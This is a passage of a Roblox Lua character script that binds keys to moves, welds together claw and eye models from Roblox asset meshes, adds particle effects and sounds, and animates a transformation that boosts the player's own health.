		elseif k=='q' then
		if attack==false then
		idle=1000
		end
		elseif k=='h' then
		if attack==false then
		mana=100
		end
		elseif k=='0' then
		if attack==false then
			Humanoid.WalkSpeed=(24)
		end
		elseif k=='j' then
		if attack==false then
			Humanoid.Health = 10
			print("Congrats, you commited suicide.")
		end
	end
end)

mouse.KeyDown:connect(function(k)
if k == "z" and Ultramode == false then
if attack==false then
if Anim == "Idle" or Anim == "Walk" or Anim == "Run" then
                attack = true
        for i = 1, 15 do
          swait()
          Neck.C0 = clerp(Neck.C0, necko * euler(0.5, 0, 0), 0.3)
          RootJoint.C0 = clerp(RootJoint.C0, RootCF * cf(0, 0, -1) * euler(0.5, 0, 0), 0.35)
          RW.C0 = clerp(RW.C0, cf(1.5, 1, 0) * euler(0, 0, 0) * euler(0.3, 0, 0.6), 0.35)
          RW.C1 = clerp(LW.C1, cf(0, 0.5, 0) * euler(0, 0, 0), 0.2)
          LW.C0 = clerp(LW.C0, cf(-1.5, 1, 0) * euler(-0.5, 0, 0) * euler(0, 0, -0.7), 0.35)
          LW.C1 = clerp(LW.C1, cf(0, 0.5, 0) * euler(0, 0, 0), 0.2)
          RH.C0 = clerp(RH.C0, cf(1, 0.25, -0.5) * euler(0.55, 0, 0) * euler(0, math.pi / 2.2, 0), 0.35)
          LH.C0 = clerp(LH.C0, cf(-1, -1, -0.5) * euler(-0.7, 0, 0) * euler(0, -math.pi / 1.8, 0), 0.35)
        end
m:Destroy()
local m = Instance.new("Model", Character)
m.Name = "WeaponModel"
local parta = Instance.new("Part",Character)
  parta.Size = vt(10,10,10)
  parta.BrickColor = BrickColor.new("Really black")
  parta.Material = "Neon"
  parta.Shape = "Ball"
  parta.Transparency = 0
  parta.Anchored = true
  parta.CanCollide = false
  parta.CFrame = tors.CFrame
                Transform()
parta:Destroy()

local modelzorzz=Instance.new("Model") 
modelzorzz.Parent=Character 
modelzorzz.Name="Claw1"

Handle=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,TorsoColor,"Handle",Vector3.new(3, 3, 3))
Handleweld=weld(m,Character["Torso"],Handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-6.74455023, 0.843135834, 3.31332064, 0.866820872, 0.000393055088, -0.498619556, 0.129048944, -0.966104209, 0.223582461, -0.481630623, -0.258152217, -0.837489963))
mesh("SpecialMesh",Handle,Enum.MeshType.Sphere,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.89693689, 0.0205960274, 1.83752108, 0.00084605813, 0.865680099, -0.500597, -0.999998748, 2.925843e-005, -0.00163948536, -0.00140464306, 0.500597715, 0.865678906))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0205993652, 3.97038841, -4.62090921, -0.999998689, 2.810359e-005, -0.00163501501, 0.00158691406, 0.25815019, -0.966103554, 0.0003949448, -0.966104805, -0.258149862))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.18639517, -0.292996764, 3.91572571, -0.407002717, 0.123095758, -0.905094743, -0.483149111, -0.869928718, 0.098949343, -0.775187671, 0.477568328, 0.413536996))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.62196398, -0.29297936, 1.11572647, -0.835932732, 0.424737811, -0.347583354, -0.483153641, -0.869926155, 0.0989501327, -0.260344028, 0.250651836, 0.932413459))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.55920649, -0.210347176, 1.642519, -0.865201712, -0.000320911407, -0.501423895, -2.98991799e-005, -0.999999881, 0.000691637397, -0.501424074, 0.000613339245, 0.865201592))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.931638, -0.0751047134, 4.50077248, -0.352038473, 0.176153034, -0.919260144, -0.86644727, -0.432817101, 0.248874903, -0.354031444, 0.884103954, 0.304995537))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.34771347, -0.763819337, 1.31078529, 0.484322906, -0.259408951, -0.835546851, 0.129806682, 0.965767562, -0.224595979, 0.865206063, 0.000317394733, 0.501416266))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.85524988, -0.0749192238, 1.7092638, -0.499263257, 0.749717236, -0.434350491, -0.866449237, -0.432811975, 0.248876765, -0.00140497088, 0.500597596, 0.865678906))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.76954031, -0.210381031, 4.2438035, -0.257231236, -0.00066010654, -0.966349661, -3.04505229e-005, -0.999999762, 0.000691249967, -0.966350019, 0.000207226723, 0.257231265))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.87043977, 0.020611763, 4.62094831, 0.00159165263, 0.258152187, -0.966103137, -0.999998748, 2.89455056e-005, -0.00163969398, -0.000395349402, 0.966104329, 0.258151829))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.292981744, 4.28636312, -3.9157095, -0.48314926, -0.869928479, 0.0989517197, -0.407004297, 0.123094313, -0.905094087, 0.775186777, -0.477569282, -0.413537562))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.85442352, -0.763632059, 3.85966015, -0.269319534, -0.183654502, -0.945377231, 0.129806384, 0.96576786, -0.22459501, 0.954262853, -0.183203816, -0.236260682))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0751276016, 4.03159618, -4.50067854, -0.866445661, -0.432817698, 0.248879611, -0.352042913, 0.176151246, -0.919258773, 0.354030937, -0.884103894, -0.304995805))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Gear=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(4.29999971, 4.30000019, 1))
Gearweld=weld(m,Handle,Gear,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0552597046, -0.0398271084, -0.0363032818, 0.999988854, -3.23429704e-005, 0.00164097548, 3.37436795e-005, 0.999994695, -0.000689953566, -0.00164103508, 0.000689953566, 0.999993086))
mesh("SpecialMesh",Gear,Enum.MeshType.FileMesh,"http://www.roblox.com/asset?id=156292343",Vector3.new(0, 0, 0),Vector3.new(5, 5, 15))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.210398674, 3.86948943, -4.24380398, -3.15159559e-005, -0.999999881, 0.00069090724, -0.257231474, -0.000659480691, -0.966349721, 0.966349959, -0.000208158046, -0.257231474))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.763661504, 3.95439076, 3.85964441, -0.129806131, -0.965767682, 0.224596098, -0.269319892, -0.1836555, -0.945376873, 0.954262733, -0.183203891, -0.236260891))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))

local modelzorzz2=Instance.new("Model") 
modelzorzz2.Parent=Character 
modelzorzz2.Name="Claw2"

Handle2=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,TorsoColor,"Handle",Vector3.new(3, 3, 3))
Handle2weld=weld(m,Character["Torso"],Handle2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(6.65693045, 1.66835713, 2.9684639, 0.866025746, 0.129405379, 0.482963592, -3.67555799e-006, -0.965926409, 0.258817136, 0.499999553, -0.224144042, -0.836516559))
mesh("SpecialMesh",Handle2,Enum.MeshType.Sphere,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.66774845, 0.445008755, 1.50737095, 0.749997497, 0.500002265, -0.433014721, -0.433012635, 0.866024196, 0.250004709, 0.500004232, -2.02655792e-006, 0.866023183))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.70916891, 0.288796425, 1.12511444, 0.424947768, 0.836517453, -0.34591651, -0.870010257, 0.482961774, 0.0991482884, 0.250003695, 0.25881803, 0.933012009))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.24143982, 0.288818121, 3.98402214, 0.123706907, 0.408494055, -0.904339194, -0.870007515, 0.482966691, 0.0991476029, 0.477266878, 0.774516642, 0.415139139))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.288883209, 4.34139919, -3.98407936, -0.870006502, 0.482969046, 0.099145025, 0.123710275, 0.408492953, -0.904339135, -0.477267861, -0.774515808, -0.415139765))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.377311707, 3.81443644, -4.17874861, 1.43051147e-006, 1.00000012, 5.58793545e-006, 0.258813858, 5.02169132e-006, -0.965927303, -0.965927362, 2.82377005e-006, -0.258813858))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.11095357, 0.452475548, 3.33581829, 0.214266971, -0.258726388, -0.941886604, 0.124996454, -0.949091196, 0.289140463, -0.968744338, -0.179685742, -0.171018958))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.445028067, 4.04179811, -4.22505188, -0.433007121, 0.86602807, 0.250001073, 0.176776409, 0.353552371, -0.918559194, -0.883886516, -0.353548348, -0.306183964))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.71447492, 0.377288342, 4.1787672, 0.258815825, 7.89761543e-007, -0.965926647, 2.11596489e-006, 1.00000012, 1.35600567e-006, 0.965926886, -2.41398811e-006, 0.258815885))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.452456236, 4.21090841, 3.33576679, -0.124996543, 0.949091196, -0.289140046, 0.214267105, -0.25872606, -0.941886783, -0.968744338, -0.179685771, -0.171019137))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.94182658, 0.445016861, 4.22507095, 0.176774979, 0.353554398, -0.918558657, -0.433007926, 0.866026998, 0.250003278, 0.883886337, 0.353548825, 0.306183696))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(1, 0.400000006, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.256506443, 3.92671657, -4.59811449, -1.00000024, 2.62260437e-006, 1.4603138e-006, -7.4505806e-007, 0.258819073, -0.965925872, -2.89268792e-006, -0.965925932, -0.258819073))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(2, 5, 2))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.4743073, 0.377253056, 1.63544273, 0.866023183, -4.61935997e-007, -0.500004172, 1.52736902e-006, 1.00000012, 1.65402889e-006, 0.500004232, -2.21282244e-006, 0.866023183))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15870619, 0.452619314, 0.758959055, -0.533491194, -0.310006529, -0.786945462, 0.124997422, -0.949090362, 0.289142251, -0.836518347, 0.0558886975, 0.545081377))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.84976673, 0.256440639, 1.85214663, 6.2584877e-007, 0.866025329, -0.500000298, -1.00000024, 1.72108412e-006, 1.7285347e-006, 2.38418579e-006, 0.500000298, 0.866025329))
Gear2=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(4.29999971, 4.30000019, 1))
Gear2weld=weld(m,Handle2,Gear2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.049841404, 0.049908638, 2.78949738e-005, 0.999990344, -5.01424074e-006, -1.49011612e-007, 5.28991222e-006, 0.999994934, 2.98023224e-008, 2.38418579e-007, -1.63912773e-007, 0.999994636))
mesh("SpecialMesh",Gear2,Enum.MeshType.FileMesh,"http://www.roblox.com/asset?id=156292343",Vector3.new(0, 0, 0),Vector3.new(5, 5, 15))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(2.20000005, 1, 1))
Partweld=weld(m,Handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.82676554, 0.256523609, 4.598104, -1.1920929e-006, 0.258818835, -0.965925872, -1.00000012, 1.46776438e-006, 1.63912773e-006, 1.83098018e-006, 0.965925872, 0.258818835))

local modelzorzz3=Instance.new("Model") 
modelzorzz3.Parent=Character 
modelzorzz3.Name="Eye"

handle=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Handle",Vector3.new(1.20000005, 1.20000005, 1.20000005))
handleweld=weld(m,Character["Torso"],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.22326851, -3.5562191, -0.038143158, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",handle,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(1, 3, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(1.20000005, 1.20000005, 1.20000005))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1.09672546e-005, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(1.102, 0.950000048, 1.16999996))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(1.20000005, 1.20000005, 1.20000005))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1.09672546e-005, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(1.102, 3, 0.863999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Part",Vector3.new(3.79999995, 4, 1.39999998))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0999984741, 0, -0.100000381, 0, -1, 0, 0, 0, 1, -1, -0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/asset/?id=3270017",Vector3.new(0, 0, 0),Vector3.new(4.77400017, 4.96199989, 4.73800039))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,TorsoColor,"Part",Vector3.new(3.79999995, 4, 1.39999998))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0999984741, 0, -0.100000381, 0, -1, 0, 0, 0, 1, -1, -0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/asset/?id=3270017",Vector3.new(0, 0, 0),Vector3.new(4.4920001, 4.70400047, 4.73800039))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Wedge",Vector3.new(0.600000024, 2.5999999, 0.599999964))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.100013733, -3.48671532, -1.09328079, 1, -2.52891718e-012, -6.81310423e-013, 2.53075664e-012, 0.866021812, 0.500005603, -6.74442273e-013, -0.500005603, 0.866021752))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Wedge",Vector3.new(0.600000024, 2.5999999, 0.599999964))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.100009918, -3.09970522, 1.40989685, 1, 0, 0, 0, 1, 0, 0, 0, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Wedge",Vector3.new(0.600000024, 2.5999999, 0.599999964))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.100009918, -3.09970522, 1.39007568, -0.999999702, 0, 5.96046448e-008, 0, 1, 0, -5.96046448e-008, 0, -0.999999702))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Wedge",Vector3.new(0.600000024, 2.5999999, 0.599999964))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.100013733, -3.61302567, 0.360752106, 1, -3.69486299e-012, 1.70532143e-012, 3.81851625e-012, 0.707111537, -0.707102001, 1.40679254e-012, 0.70710206, 0.707111537))

p = game.Players.LocalPlayer
char = p.Character
torso = char.Torso
neck = char.Torso.Neck
hum = char.Humanoid
hum.MaxHealth = 1675000
wait()
hum.Health =hum.MaxHealth

local particleemitter = Instance.new("ParticleEmitter", Handle)
particleemitter.VelocitySpread = 180
particleemitter.Lifetime = NumberRange.new(0.1)
particleemitter.Speed = NumberRange.new(2)
particleemitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 5.563)})
particleemitter.RotSpeed = NumberRange.new(-45, 45)
particleemitter.Rate = 100
particleemitter.Rotation = NumberRange.new(-45, 45)
particleemitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.701, 0), NumberSequenceKeypoint.new(1, 1)})
particleemitter.LightEmission = 0.8
particleemitter.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(0, 0, 0))

local particleemitter = Instance.new("ParticleEmitter", Handle2)
particleemitter.VelocitySpread = 180
particleemitter.Lifetime = NumberRange.new(0.1)
particleemitter.Speed = NumberRange.new(2)
particleemitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 5.563)})
particleemitter.RotSpeed = NumberRange.new(-45, 45)
particleemitter.Rate = 100
particleemitter.Rotation = NumberRange.new(-45, 45)
particleemitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.701, 0), NumberSequenceKeypoint.new(1, 1)})
particleemitter.LightEmission = 0.8
particleemitter.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(0, 0, 0))

local particleemitter = Instance.new("ParticleEmitter", handle)
particleemitter.VelocitySpread = 180
particleemitter.Lifetime = NumberRange.new(0.1)
particleemitter.Speed = NumberRange.new(2)
particleemitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 7.563)})
particleemitter.RotSpeed = NumberRange.new(-45, 45)
particleemitter.Rate = 100
particleemitter.Rotation = NumberRange.new(-45, 45)
particleemitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.701, 0), NumberSequenceKeypoint.new(1, 1)})
particleemitter.LightEmission = 0.8
particleemitter.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(0, 0, 0))

particleemitter.Enabled = true
    MagicCircle(BrickColor.new("Really black"),cf(Torso.Position),75,75,75,35,35,35,0.025)
    MagicCircle(BrickColor.new("Really black"),cf(Torso.Position),76,76,76,36,36,36,0.025)
    so("http://www.roblox.com/asset/?id=150829983",Character,3,0.475)
    so("http://www.roblox.com/asset/?id=231917742",Character,3,0.75)
    for i=0,1,0.005 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,5+1*i)*angles(math.rad(-15),math.rad(0),math.rad(0)),0.1)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-25),math.rad(0),math.rad(0)),0.1)
        handleweld.C0=clerp(handleweld.C0,cf(0,0+1*i,0)*angles(math.rad(0),math.rad(0),math.rad(0)),0.1)
        Handle2weld.C0=clerp(Handle2weld.C0,cf(0-1*i,0,0)*angles(math.rad(90),math.rad(15),math.rad(0)),0.1)
        Handleweld.C0=clerp(Handleweld.C0,cf(0+1*i,0,0)*angles(math.rad(90),math.rad(-15),math.rad(0)),0.1)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(-30)),0.1)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(30)),0.1)
        RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-30),math.rad(0),math.rad(-30)),0.1)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-30),math.rad(0),math.rad(30)),0.1)
    end
    for i=0,1,0.04 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-1)*angles(math.rad(40),math.rad(0),math.rad(-40)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.2)
        Handleweld.C0=clerp(Handleweld.C0,cf(1.5,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.2)  
        Handle2weld.C0=clerp(Handle2weld.C0,cf(-1.5,3,0)*angles(math.rad(0),math.rad(180),math.rad(180)),.2)  
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-40),math.rad(0),math.rad(40)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(70),math.rad(0),math.rad(-45)),.3)
       	RH.C0=clerp(RH.C0,cf(1,-1,0)*euler(0,1.57,0)*angles(math.rad(0),math.rad(0),math.rad(-20)),.3)
		LH.C0=clerp(LH.C0,cf(-1,0.5,0)*euler(0,-1.57,0)*angles(math.rad(-10),math.rad(30),math.rad(-40)),.3)
    end
attack = false
end
end
end
end)

function Hai()
    attack=true
    Humanoid.WalkSpeed=0
    so("http://www.roblox.com/asset/?id=0",Torso,1,1)
    for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
